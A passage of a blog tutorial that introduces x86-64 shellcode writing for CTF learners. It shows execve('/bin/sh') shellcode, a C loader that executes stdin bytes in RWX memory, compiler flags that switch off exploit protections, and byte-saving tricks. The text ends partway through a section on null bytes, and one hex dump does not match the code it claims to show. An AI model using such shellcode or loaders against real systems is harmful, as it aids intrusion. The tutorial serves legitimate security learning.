@@ -1,0 +1,293 @@
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><title>Shellcode 101: The notes i wish existed when i started learning shellcode - Iossefy </title><meta name=HandheldFriendly content="True"><meta name=MobileOptimized content="320"><meta name=referrer content="no-referrer"><meta property="og:site_name" content="Iossefy"><meta property="og:locale" content="en_US"><meta property="og:url" content="/blog/shellcode-101-the-notes-i-wish-existed-when-i-started-learning-shellcode/"><meta property="og:site_name" content="Iossefy"><meta property="og:title" content="Shellcode 101: The notes i wish existed when i started learning shellcode"><meta property="og:description" content="I have faith of who ever reading this article is not a layman, you are probably familiar with CTFs, overflowed the buffer and smashed the stack once, and knowing what you are getting your self into. I assume you know what a CTF challenge is, x86 assembly basics, and using linux.
+The term “shellcode” originates from the common objective of an exploit usually to execute a command shell /bin/sh. the code is written in an assembly language."><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="blog"><meta property="article:published_time" content="2025-09-28T12:00:00+00:00"><meta property="article:modified_time" content="2025-09-28T12:00:00+00:00"><meta property="article:tag" content="Ctf"><meta property="article:tag" content="Shellcode"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="Shellcode 101: The notes i wish existed when i started learning shellcode"><meta name=twitter:description content="iossefy's personal website/Blog."><meta name=twitter:image content="/"><link rel=canonical href=/blog/shellcode-101-the-notes-i-wish-existed-when-i-started-learning-shellcode/><link rel=stylesheet href=/css/site.min.css><link rel=stylesheet href=/css/custom.css><link rel=stylesheet href=/css/syntax.css><link rel=apple-touch-icon sizes=180x180 href=/img/fav/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/img/fav/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/img/fav/favicon-16x16.png><link rel=manifest href=/img/fav/site.webmanifest><meta name=msapplication-TileColor content="#da532c"><meta name=theme-color content="#ffffff"></head><body><div class="mt-xl header"><header><div class=container><div class="row justify-content-center"><div class=col-auto><a href=/ style=display:contents><h1 class="name text-center">Iossefy</h1></a></div></div><div class="row justify-content-center"><div class="nav justify-content-center"><ul><li class="nav-item justify-content-center mx-auto"><a class=nav-link href=/>~/</a></li><li class="nav-item justify-content-center mx-auto"><a class=nav-link href=/about>About</a></li><li class="nav-item justify-content-center mx-auto"><a class=nav-link href=https://github.com/iossefy>Github</a></li><li class="nav-item justify-content-center mx-auto"><a class=nav-link href=/index.xml>rss</a></li></ul></div></div></div></header></div><div class=content><div class=container><div class="row justify-content-center"><div class="col-sm-12 col-lg-8"><h1 class="mx-0 mx-md-4 blog-post-title">Shellcode 101: The notes i wish existed when i started learning shellcode</h1><div class="meta-data meta">iossefy
+</span><span class="date middot meta-data" title='Sun Sep 28 2025 12:00:00 UTC'>2025-09-28
+</span><span class="reading-time middot meta-data">11 min read
+</span><a class="middot meta-data" href=/blog/shellcode-101-the-notes-i-wish-existed-when-i-started-learning-shellcode/>Permalink</a><div class="d-none d-md-inline tags"><ul class="list-unstyled d-inline"><li class=d-inline style=margin-right:.5rem><a class=boxed-tag href=/tags/ctf># ctf</a></li><li class=d-inline style=margin-right:.5rem><a class=boxed-tag href=/tags/shellcode># shellcode</a></li></ul></div></div><div class="markdown blog-post-content"><p>I have faith of who ever reading this article is not a layman, you are probably
+familiar with CTFs, overflowed the buffer and smashed the stack once, and
+knowing what you are getting your self into. I assume you know what a CTF challenge is, x86 assembly basics, and using linux.</p><p>The term &ldquo;shellcode&rdquo; originates from the common objective of an exploit usually
+to execute a command shell <code>/bin/sh</code>. the code is written in an assembly
+language.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=ln> 1</span><span class=cl><span class=c1>#execve(&#34;/bin/bash&#34;,{NULL},{NULL})
+</span></span></span><span class=line><span class=ln> 2</span><span class=cl><span class=c1></span><span class=na>.text</span>
+</span></span><span class=line><span class=ln> 3</span><span class=cl><span class=na>.global</span> <span class=no>_start</span>
+</span></span><span class=line><span class=ln> 4</span><span class=cl><span class=nl>_start:</span>
+</span></span><span class=line><span class=ln> 5</span><span class=cl>    <span class=nf>mov</span> <span class=no>rax</span><span class=p>,</span> <span class=mi>0x68732f6e69622f</span>
+</span></span><span class=line><span class=ln> 6</span><span class=cl>    <span class=nf>push</span> <span class=no>rax</span>
+</span></span><span class=line><span class=ln> 7</span><span class=cl>    <span class=nf>push</span> <span class=no>rsp</span>
+</span></span><span class=line><span class=ln> 8</span><span class=cl>    <span class=nf>pop</span> <span class=no>rdi</span>
+</span></span><span class=line><span class=ln> 9</span><span class=cl>    <span class=nf>xor</span> <span class=no>eax</span><span class=p>,</span> <span class=no>eax</span>
+</span></span><span class=line><span class=ln>10</span><span class=cl>    <span class=nf>push</span> <span class=no>rax</span>
+</span></span><span class=line><span class=ln>11</span><span class=cl>    <span class=nf>mov</span> <span class=no>al</span><span class=p>,</span> <span class=mi>59</span>
+</span></span><span class=line><span class=ln>12</span><span class=cl>    <span class=nf>push</span> <span class=no>rsp</span>
+</span></span><span class=line><span class=ln>13</span><span class=cl>    <span class=nf>pop</span> <span class=no>rdx</span>
+</span></span><span class=line><span class=ln>14</span><span class=cl>    <span class=nf>push</span> <span class=no>rsp</span>
+</span></span><span class=line><span class=ln>15</span><span class=cl>    <span class=nf>pop</span> <span class=no>rsi</span>
+</span></span><span class=line><span class=ln>16</span><span class=cl>    <span class=nf>syscall</span>
+</span></span></code></pre></div><p>Looking at his code for a first time is intimidating, and scary. but once you
+learn how to read it, writing the shellcode would be the easiest part of the job.</p><h1 id=how-does-it-execute>How does it execute</h1><p>shellcode is simply <em>executable bytes</em>, it is a machine instructions assembled
+to perform a small task once control is hijacked.</p><p>In today&rsquo;s computers, there are two architectures, <strong>Von Neumann</strong>, which sees
+and stores code as data. And Harvard architectures that stores data and code
+separately.</p><p>almost all general purpose architectures (x86, ARM, MIPS, etc..) are Von
+Neumann. That would be the focus of this article.</p><p>Starting out, we will use a simple shellcode loader to test and execute our
+shellcode.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=ln> 1</span><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=ln> 2</span><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/mman.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=ln> 3</span><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt; // for read()</span><span class=cp>
+</span></span></span><span class=line><span class=ln> 4</span><span class=cl><span class=cp></span>
+</span></span><span class=line><span class=ln> 5</span><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=ln> 6</span><span class=cl>    <span class=c1>// 1. Allocate an executable memory page.
+</span></span></span><span class=line><span class=ln> 7</span><span class=cl><span class=c1></span>    <span class=c1>//    PROT_READ | PROT_WRITE | PROT_EXEC: The memory can be read, written to, and executed.
+</span></span></span><span class=line><span class=ln> 8</span><span class=cl><span class=c1></span>    <span class=c1>//    MAP_PRIVATE | MAP_ANON: The mapping is private to this process and not backed by a file.
+</span></span></span><span class=line><span class=ln> 9</span><span class=cl><span class=c1></span>    <span class=kt>void</span> <span class=o>*</span><span class=n>page</span> <span class=o>=</span> <span class=nf>mmap</span><span class=p>(</span><span class=nb>NULL</span><span class=p>,</span> <span class=mi>4096</span><span class=p>,</span> <span class=n>PROT_READ</span> <span class=o>|</span> <span class=n>PROT_WRITE</span> <span class=o>|</span> <span class=n>PROT_EXEC</span><span class=p>,</span> <span class=n>MAP_PRIVATE</span> <span class=o>|</span> <span class=n>MAP_ANON</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=ln>10</span><span class=cl>
+</span></span><span class=line><span class=ln>11</span><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>page</span> <span class=o>==</span> <span class=n>MAP_FAILED</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=ln>12</span><span class=cl>        <span class=nf>perror</span><span class=p>(</span><span class=s>&#34;mmap failed&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=ln>13</span><span class=cl>        <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
+</span></span><span class=line><span class=ln>14</span><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=ln>15</span><span class=cl>
+</span></span><span class=line><span class=ln>16</span><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;[+] Memory allocated at: %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>page</span><span class=p>);</span>
+</span></span><span class=line><span class=ln>17</span><span class=cl>
+</span></span><span class=line><span class=ln>18</span><span class=cl>    <span class=c1>// 2. Read shellcode from standard input (stdin) into the allocated page.
+</span></span></span><span class=line><span class=ln>19</span><span class=cl><span class=c1></span>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;[+] Reading shellcode from stdin...</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=ln>20</span><span class=cl>    <span class=kt>ssize_t</span> <span class=n>bytes_read</span> <span class=o>=</span> <span class=nf>read</span><span class=p>(</span><span class=n>STDIN_FILENO</span><span class=p>,</span> <span class=n>page</span><span class=p>,</span> <span class=mi>4095</span><span class=p>);</span>
+</span></span><span class=line><span class=ln>21</span><span class=cl>
+</span></span><span class=line><span class=ln>22</span><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>bytes_read</span> <span class=o>&lt;=</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=ln>23</span><span class=cl>        <span class=nf>perror</span><span class=p>(</span><span class=s>&#34;read failed or no input provided&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=ln>24</span><span class=cl>        <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
+</span></span><span class=line><span class=ln>25</span><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=ln>26</span><span class=cl>
+</span></span><span class=line><span class=ln>27</span><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;[+] Read %ld bytes. Executing now...</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>bytes_read</span><span class=p>);</span>
+</span></span><span class=line><span class=ln>28</span><span class=cl>
+</span></span><span class=line><span class=ln>29</span><span class=cl>    <span class=c1>// 3. Create a function pointer to the page and call it.
+</span></span></span><span class=line><span class=ln>30</span><span class=cl><span class=c1></span>    <span class=c1>//    This transfers execution to the shellcode.
+</span></span></span><span class=line><span class=ln>31</span><span class=cl><span class=c1></span>    <span class=kt>void</span> <span class=p>(</span><span class=o>*</span><span class=n>shellcode_func</span><span class=p>)()</span> <span class=o>=</span> <span class=n>page</span><span class=p>;</span>
+</span></span><span class=line><span class=ln>32</span><span class=cl>    <span class=nf>shellcode_func</span><span class=p>();</span>
+</span></span><span class=line><span class=ln>33</span><span class=cl>
+</span></span><span class=line><span class=ln>34</span><span class=cl>    <span class=c1>// This line will likely not be reached if the shellcode exits.
+</span></span></span><span class=line><span class=ln>35</span><span class=cl><span class=c1></span>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=ln>36</span><span class=cl><span class=p>}</span>
+</span></span></code></pre></div><p>Shellcode is just bytes. If you want to execute it, those bytes must live in
+memory marked as executable.</p><p>the <code>mmap</code> call is important, if we requested a memory without <code>PROT_EXEC</code> The
+moment the program tried to execute the code at page, the CPU&rsquo;s memory
+management unit would see the &ldquo;No-Execute&rdquo; permission on that memory page and
+trigger a protection fault, resulting in a <code>SIGSEGV</code>.</p><p>We are asking for a single page (0x1000 bytes) of memory that is</p><ol><li><strong>Writable</strong>: we load shellcode bytes into it using <code>read</code></li><li><strong>Executable</strong>: the CPU will happily <code>jmp</code> into it without complaining.</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=ln>1</span><span class=cl><span class=kt>void</span> <span class=o>*</span><span class=n>page</span> <span class=o>=</span> <span class=nf>mmap</span><span class=p>(</span>
+</span></span><span class=line><span class=ln>2</span><span class=cl>    <span class=nb>NULL</span><span class=p>,</span>                <span class=c1>// Let the kernel choose the address
+</span></span></span><span class=line><span class=ln>3</span><span class=cl><span class=c1></span>    <span class=mi>4096</span><span class=p>,</span>                <span class=c1>// One page = 4096 bytes (common page size)
+</span></span></span><span class=line><span class=ln>4</span><span class=cl><span class=c1></span>    <span class=n>PROT_READ</span> <span class=o>|</span> <span class=n>PROT_WRITE</span> <span class=o>|</span> <span class=n>PROT_EXEC</span><span class=p>,</span> <span class=c1>// Permissions: read, write, execute
+</span></span></span><span class=line><span class=ln>5</span><span class=cl><span class=c1></span>    <span class=n>MAP_PRIVATE</span> <span class=o>|</span> <span class=n>MAP_ANON</span><span class=p>,</span> <span class=c1>// Private mapping, not backed by a file
+</span></span></span><span class=line><span class=ln>6</span><span class=cl><span class=c1></span>    <span class=o>-</span><span class=mi>1</span><span class=p>,</span>                  <span class=c1>// File descriptor (-1 since it&#39;s anonymous)
+</span></span></span><span class=line><span class=ln>7</span><span class=cl><span class=c1></span>    <span class=mi>0</span>                    <span class=c1>// Offset (not used here)
+</span></span></span><span class=line><span class=ln>8</span><span class=cl><span class=c1></span><span class=p>);</span>
+</span></span></code></pre></div><p>The code is not compiled using the default <code>gcc</code> configuration, by default,
+modern compilers have protection against shellcode, you need to disable when
+compiling the program.</p><pre tabindex=0><code>gcc -ggdb -g3 execute.c -fno-stack-protector -z execstack -no-pie -fno-pie -o execute
+</code></pre><p>Using checksec, we see the <code>Stack: Executable</code>. That means that the data on the
+stack could be treated as code.</p><pre>
+$ pwn checksec --file=execute
+[*] '/tmp/test/execute'
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      No canary found
+    NX:         NX unknown - GNU_STACK missing
+    PIE:        No PIE (0x400000)
+    Stack:      Executable
+    RWX:        Has RWX segments
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+    Debuginfo:  Yes
+</pre><h1 id=writing-shellcode>Writing Shellcode</h1><p>Before i start to write shellcode, i open loads documentation, syscall tables,
+and the manual for whatever assembly architecture i am writing. To mention a
+few, I use the <a href="https://syscalls.mebeim.net/?table=x86/64/x64/latest">Systrack: Linux kernel syscall
+tables</a> for system calls
+lookups. And <a href=https://www.felixcloutier.com/x86/>felix cloutier&rsquo;s x86 and amd64 instruction
+reference</a>, It&rsquo;s easier to navigate, but the
+offical intel manual also works.</p><p>When writing shellcode, your goal is to execute Syscalls. Syscalls = system calls.
+They’re the special functions your program uses to talk to the kernel (the OS core).</p><ul><li><code>read</code> to ask kernel to read from a file.</li><li><code>write</code> to ask kernel to write to a file.</li><li><code>execve</code> to ask the kernel to run another program.</li><li><code>exit</code> to tell kernel you’re done and exit cleanly.</li></ul><p>Syscalls are functions, like any other functions, the take parameters. It is not
+as easy as <code>function(arg1, arg2, arg3)</code>, but you learn to do it.</p><p>Call convention for <strong>x86</strong> and <strong>x86_64</strong> architechtures:</p><table><thead><tr><th>ARCH</th><th>RETURN</th><th>ARG0</th><th>ARG1</th><th>ARG2</th><th>ARG3</th><th>ARG4</th><th>ARG5</th></tr></thead><tbody><tr><td>x86</td><td>eax</td><td>ebx</td><td>ecx</td><td>edx</td><td>esi</td><td>edi</td><td>ebp</td></tr><tr><td>x64</td><td>rax</td><td>rdi</td><td>rsi</td><td>rdx</td><td>r10</td><td>r8</td><td>r9</td></tr></tbody></table><p>To execute shellcode, You lookup the syscall number you want, the simplist
+example is <code>exit()</code> syscall, looking it up in a <code>man</code> <a href=https://www.man7.org/linux/man-pages/man3/exit.3.html>page</a> you find this
+definition</p><pre tabindex=0><code>exit - cause normal process termination
+
+#include &lt;stdlib.h&gt;
+
+[[noreturn]] void exit(int status);
+</code></pre><p>It takes only one parameter, exit status. On unix-like systems, a successful
+exit is <code>exit(0)</code>, so lets write that in shellcode. Never mind the first 3
+lines, they are important for the compiler not for us for this case.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=ln>1</span><span class=cl><span class=na>.intel_syntax</span> <span class=no>noprefix</span>
+</span></span><span class=line><span class=ln>2</span><span class=cl>
+</span></span><span class=line><span class=ln>3</span><span class=cl><span class=na>.global</span> <span class=no>_start</span>
+</span></span><span class=line><span class=ln>4</span><span class=cl>
+</span></span><span class=line><span class=ln>5</span><span class=cl><span class=nl>_start:</span>
+</span></span><span class=line><span class=ln>6</span><span class=cl>    <span class=nf>mov</span> <span class=no>rax</span><span class=p>,</span> <span class=mi>60</span>      <span class=c1># syscall for exit
+</span></span></span><span class=line><span class=ln>7</span><span class=cl><span class=c1></span>    <span class=nf>syscall</span>          <span class=c1># execute the shellcode
+</span></span></span></code></pre></div><p>Compile the shellcode using the following.</p><pre tabindex=0><code>gcc -nostdlib -static hello.S -o hello.elf
+</code></pre><p>This will create an <code>elf</code> file, inspect it and see the disassembly code.
+<code>objdump</code>.</p><pre tabindex=0><code>$ objdump -d -Mintel hello.elf
+
+hello.elf:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000401000 &lt;_start&gt;:
+  401000:   48 c7 c0 3c 00 00 00   mov    rax,0x3c
+  401007:   0f 05                  syscall
+</code></pre><p>We only want the <code>.text</code> section of the <code>elf</code> file. to extract it use <code>objdump</code></p><pre tabindex=0><code>objcopy --dump-section .text=hello.bin hello.elf
+</code></pre><p>Use <code>xxd</code> to get compiled code</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-perl data-lang=perl><span class=line><span class=ln>1</span><span class=cl><span class=nv>$</span> <span class=nv>xxd</span> <span class=n>hello</span><span class=o>.</span><span class=n>bin</span>
+</span></span><span class=line><span class=ln>2</span><span class=cl><span class=mo>00000000</span><span class=p>:</span> <span class=mi>48</span><span class=n>c7</span> <span class=n>c078</span> <span class=mo>0000</span> <span class=mo>00</span><span class=n>bb</span> <span class=mo>0200</span> <span class=mo>0000</span> <span class=mi>4831</span> <span class=n>db6a</span>  <span class=n>H</span><span class=o>..</span><span class=n>x</span><span class=o>........</span><span class=n>H1</span><span class=o>.</span><span class=n>j</span>
+</span></span><span class=line><span class=ln>3</span><span class=cl><span class=mo>00000010</span><span class=p>:</span> <span class=mi>785</span><span class=n>f</span>                                     <span class=n>x_</span>
+</span></span></code></pre></div><p>You can run the <code>elf</code> file just like any other linux program. it exits with
+status <code>0</code>, to check the status echo <code>$?</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=ln>1</span><span class=cl>./hello.elf
+</span></span><span class=line><span class=ln>2</span><span class=cl><span class=nb>echo</span> <span class=nv>$?</span>
+</span></span><span class=line><span class=ln>3</span><span class=cl><span class=c1># 0</span>
+</span></span></code></pre></div><p>For more logging use <code>strace</code> to see the <code>syscall</code>s get executed.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=ln>1</span><span class=cl>strace ./hello.elf
+</span></span><span class=line><span class=ln>2</span><span class=cl><span class=c1># execve(&#34;./hello.elf&#34;, [&#34;./hello.elf&#34;], 0x7ffe3fbd8560 /* 73 vars */) = 0</span>
+</span></span><span class=line><span class=ln>3</span><span class=cl><span class=c1># exit(0)                                 = ?</span>
+</span></span><span class=line><span class=ln>4</span><span class=cl><span class=c1># +++ exited with 0 +++</span>
+</span></span></code></pre></div><p>Now enough with long introduction, Lets get into the notes.</p><h1 id=problems-you-would-run-into-when-writing-shellcode>Problems you would run into when writing shellcode</h1><p>Here are some of the common problems that you will run into eventually when you
+are writing shellcode.</p><h2 id=size-constraints-byte-budget-hell>Size constraints (Byte budget hell)</h2><p>Your goal is to use the smallest number of bytes as possible.</p><h3 id=xor-instruction>XOR Instruction</h3><p>Be careful of using <code>mov</code> too much. To zero out a register, do not use the
+instruction <code>mov</code>. Use <code>xor</code> instead.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=ln>1</span><span class=cl><span class=nf>mov</span>    <span class=no>al</span><span class=p>,</span><span class=mi>0x0</span>       <span class=c1>; b0 00
+</span></span></span><span class=line><span class=ln>2</span><span class=cl><span class=c1></span><span class=nf>mov</span>    <span class=no>ax</span><span class=p>,</span><span class=mi>0x0</span>       <span class=c1>; 66 b8 00 00
+</span></span></span><span class=line><span class=ln>3</span><span class=cl><span class=c1></span><span class=nf>mov</span>    <span class=no>eax</span><span class=p>,</span><span class=mi>0x0</span>      <span class=c1>; b8 00 00 00 00
+</span></span></span><span class=line><span class=ln>4</span><span class=cl><span class=c1></span><span class=nf>mov</span>    <span class=no>rax</span><span class=p>,</span><span class=mi>0x0</span>      <span class=c1>; 48 c7 c0 00 00 00 00
+</span></span></span><span class=line><span class=ln>5</span><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=ln>6</span><span class=cl><span class=nf>xor</span>    <span class=no>al</span><span class=p>,</span><span class=no>al</span>        <span class=c1>; 30 c0
+</span></span></span><span class=line><span class=ln>7</span><span class=cl><span class=c1></span><span class=nf>xor</span>    <span class=no>ax</span><span class=p>,</span><span class=no>ax</span>        <span class=c1>; 66 31 c0
+</span></span></span><span class=line><span class=ln>8</span><span class=cl><span class=c1></span><span class=nf>xor</span>    <span class=no>eax</span><span class=p>,</span><span class=no>eax</span>      <span class=c1>; 31 c0
+</span></span></span><span class=line><span class=ln>9</span><span class=cl><span class=c1></span><span class=nf>xor</span>    <span class=no>rax</span><span class=p>,</span><span class=no>rax</span>      <span class=c1>; 48 31 c0
+</span></span></span></code></pre></div><h3 id=push-pop>Push Pop</h3><p><code>push</code> something to the stack, and get it back by using <code>pop</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=ln>1</span><span class=cl><span class=c1>;; 7 bytes
+</span></span></span><span class=line><span class=ln>2</span><span class=cl><span class=c1></span><span class=nf>mov</span> <span class=no>rax</span><span class=p>,</span> <span class=mi>0xbadc0de</span>      <span class=c1>; 48 c7 c0 de c0 ad 0b
+</span></span></span><span class=line><span class=ln>3</span><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=ln>4</span><span class=cl><span class=c1>;; 6 bytes
+</span></span></span><span class=line><span class=ln>5</span><span class=cl><span class=c1></span><span class=nf>push</span>   <span class=mi>0xbadc0de</span>        <span class=c1>; 68 de c0 ad 0b
+</span></span></span><span class=line><span class=ln>6</span><span class=cl><span class=c1></span><span class=nf>pop</span>    <span class=no>rax</span>              <span class=c1>; 58
+</span></span></span></code></pre></div><h3 id=use-what-you-have>Use what you have</h3><p>When you hijack the control flow of the code (e.g <code>jmp rax</code>) you may already
+have some values stored at the registers. for example, when using the <code>read</code>
+syscall, and <code>rdx</code> has a non-zero value. Use it as it is as the parameter
+<code>count</code>. It is a sitiuation dependent but you get the point.</p><h2 id=strings>Strings</h2><p>If you think strings are hard in C, well let me introduce you to <em>x86_64</em>.</p><p>I will use <code>open</code> syscall as an example.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=ln>1</span><span class=cl><span class=c1># open(&#34;/flag&#34;, O_RDONLY)
+</span></span></span><span class=line><span class=ln>2</span><span class=cl><span class=c1></span><span class=nf>mov</span> <span class=no>rbx</span><span class=p>,</span> <span class=mi>0x67616c662f</span>           <span class=c1># push /flag filename
+</span></span></span><span class=line><span class=ln>3</span><span class=cl><span class=c1></span><span class=nf>push</span> <span class=no>rbx</span>
+</span></span><span class=line><span class=ln>4</span><span class=cl><span class=nf>mov</span> <span class=no>rax</span><span class=p>,</span> <span class=mi>2</span>                      <span class=c1># open() syscall
+</span></span></span><span class=line><span class=ln>5</span><span class=cl><span class=c1></span><span class=nf>mov</span> <span class=no>rdi</span><span class=p>,</span> <span class=no>rsp</span>                    <span class=c1># point to first item on stack (&#34;/flag&#34;)
+</span></span></span><span class=line><span class=ln>6</span><span class=cl><span class=c1></span><span class=nf>mov</span> <span class=no>rsi</span><span class=p>,</span> <span class=mi>0</span>                      <span class=c1># NULL the second arg (O_RDONLY)
+</span></span></span><span class=line><span class=ln>7</span><span class=cl><span class=c1></span><span class=nf>syscall</span>                         <span class=c1># open(&#34;/flag&#34;, NULL)
+</span></span></span></code></pre></div><p>This <code>0x67616c662f</code> is <code>/flag</code>. it&rsquo;s in little endian. to reproduce it you have
+to run the following command.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=ln>1</span><span class=cl><span class=nb>echo</span> -ne <span class=s2>&#34;/flag&#34;</span> <span class=p>|</span> rev <span class=p>|</span> xxd -p
+</span></span><span class=line><span class=ln>2</span><span class=cl><span class=c1># 67616c662f</span>
+</span></span></code></pre></div><p>The down side is you will struggle with long
+strings as it may not fit in the registers. One other way using labels, I prefer this way but it may not always work.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=ln> 1</span><span class=cl><span class=c1># open(&#34;/flag&#34;, O_RDONLY)
+</span></span></span><span class=line><span class=ln> 2</span><span class=cl><span class=c1></span><span class=nf>push</span> <span class=mi>2</span>
+</span></span><span class=line><span class=ln> 3</span><span class=cl><span class=nf>pop</span> <span class=no>rax</span>             <span class=c1># open syscall = 2
+</span></span></span><span class=line><span class=ln> 4</span><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=ln> 5</span><span class=cl><span class=nf>lea</span> <span class=no>rdi</span><span class=p>,</span> <span class=p>[</span><span class=no>rip</span><span class=err>+</span><span class=no>flag</span><span class=p>]</span>     <span class=c1># flag string
+</span></span></span><span class=line><span class=ln> 6</span><span class=cl><span class=c1></span><span class=nf>xor</span> <span class=no>rsi</span><span class=p>,</span> <span class=no>rsi</span>        <span class=c1># O_RDONLY = 0
+</span></span></span><span class=line><span class=ln> 7</span><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=ln> 8</span><span class=cl><span class=nf>syscall</span>
+</span></span><span class=line><span class=ln> 9</span><span class=cl>
+</span></span><span class=line><span class=ln>10</span><span class=cl><span class=nl>flag:</span>
+</span></span><span class=line><span class=ln>11</span><span class=cl>  <span class=na>.string</span> <span class=s>&#34;/flag&#34;</span>
+</span></span></code></pre></div><p>There is also building the string on the stack. almost always work, but it
+requires lots of work.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=ln> 1</span><span class=cl><span class=c1># open(&#34;/flag&#34;, O_RDONLY)
+</span></span></span><span class=line><span class=ln> 2</span><span class=cl><span class=c1># push &#34;flag&#34; little endian to stack
+</span></span></span><span class=line><span class=ln> 3</span><span class=cl><span class=c1></span><span class=nf>push</span> <span class=mi>0x67616C66</span>
+</span></span><span class=line><span class=ln> 4</span><span class=cl><span class=nf>pop</span>  <span class=no>rax</span>                        <span class=c1># rax = 0x0000000067616C66
+</span></span></span><span class=line><span class=ln> 5</span><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=ln> 6</span><span class=cl><span class=c1># shift left 8 bits to make room for the &#39;/&#39; byte
+</span></span></span><span class=line><span class=ln> 7</span><span class=cl><span class=c1></span><span class=nf>shl</span>  <span class=no>rax</span><span class=p>,</span> <span class=mi>8</span>                     <span class=c1># rax = 0x00000067616C6600
+</span></span></span><span class=line><span class=ln> 8</span><span class=cl><span class=c1># load &#39;/&#39; (0x2F) into rbx using push/pop
+</span></span></span><span class=line><span class=ln> 9</span><span class=cl><span class=c1></span><span class=nf>push</span> <span class=mi>0x2F</span>
+</span></span><span class=line><span class=ln>10</span><span class=cl><span class=nf>pop</span>  <span class=no>rbx</span>                        <span class=c1># rbx = 0x...0000002F
+</span></span></span><span class=line><span class=ln>11</span><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=ln>12</span><span class=cl><span class=c1># OR the &#39;/&#39; into the low byte
+</span></span></span><span class=line><span class=ln>13</span><span class=cl><span class=c1></span><span class=nf>or</span>   <span class=no>rax</span><span class=p>,</span> <span class=no>rbx</span>                   <span class=c1># rax = 0x00000067616C662F
+</span></span></span><span class=line><span class=ln>14</span><span class=cl><span class=c1># push the 64-bit qword (stack gets &#34;/flag\0\0\0&#34; in little-endian)
+</span></span></span><span class=line><span class=ln>15</span><span class=cl><span class=c1></span><span class=nf>push</span> <span class=no>rax</span>
+</span></span><span class=line><span class=ln>16</span><span class=cl>
+</span></span><span class=line><span class=ln>17</span><span class=cl><span class=nf>push</span> <span class=mi>2</span>                          <span class=c1># open syscall
+</span></span></span><span class=line><span class=ln>18</span><span class=cl><span class=c1></span><span class=nf>pop</span> <span class=no>rax</span>
+</span></span><span class=line><span class=ln>19</span><span class=cl>
+</span></span><span class=line><span class=ln>20</span><span class=cl><span class=nf>lea</span> <span class=no>rdi</span><span class=p>,</span> <span class=p>[</span><span class=no>rsp</span><span class=p>]</span>                  <span class=c1># filename = &#34;/flag&#34;
+</span></span></span><span class=line><span class=ln>21</span><span class=cl><span class=c1></span><span class=nf>xor</span> <span class=no>rsi</span><span class=p>,</span> <span class=no>rsi</span>                    <span class=c1># mode_t = O_RDONLY
+</span></span></span><span class=line><span class=ln>22</span><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=ln>23</span><span class=cl><span class=nf>syscall</span>
+</span></span></code></pre></div><h2 id=input-filtering>Input filtering</h2><p>Input maybe manipulated, filtered of some bytes before execution.</p><h3 id=string-termination--x00ull--bytes>String termination & <code>\x00</code>ull bytes</h3><p>One great resource i found is
+<a href=https://nets.ec/Shellcode/Null-free>nets.ec/Shellcode/Null-free</a> which has
